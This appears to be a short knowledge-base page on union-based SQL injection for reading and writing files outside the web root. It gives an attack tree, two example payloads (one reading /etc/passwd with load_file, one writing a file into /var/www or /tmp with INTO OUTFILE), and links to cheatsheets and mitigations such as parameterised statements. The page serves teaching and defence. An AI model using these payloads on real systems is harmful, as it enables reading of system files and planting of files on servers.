# Read and write local files outside of www root

## Attack tree

```text
1 SQL injection extract data from 
    1.1 Find out if the database is vulnerable (AND)
        1.1.1 Inject data in the query without breaking it
    1.2 Find the amount of columns (AND)
    1.3 Find which columns accept queries (AND)
    1.4 Build an UNION SELECT SQL segment
    1.5 Inject SQL statements into the column
    1.4 Post exploitation
```
## Example SQL segments

Read file:
```text
-1' UniOn selEct 1,load_file('/etc/passwd') /*
```

Write file (only works with permission to write to `/var/www/` of course, otherwise use `/tmp/`):
```text
-1' UniOn selEct null,'example,example' inTo outfile '/var/www/example.txt' /*
```

## Notes

Union-based SQL injection is the most common of all the SQL injections. It uses the UNION statement to integrate two or 
more SELECT statements in a SQL query thereby obtaining data illegally from the database.

## Cheatsheets
* [Detect number of columns](cheatsheets:docs/databases/number-of-columns)
* [Union SQLi queries](cheatsheets:docs/databases/union-select)

## Mitigations
* [Parameterised statements](app-mitigations:docs/databases/parameterised)
* [Input validation](app-mitigations:docs/databases/Input-validation)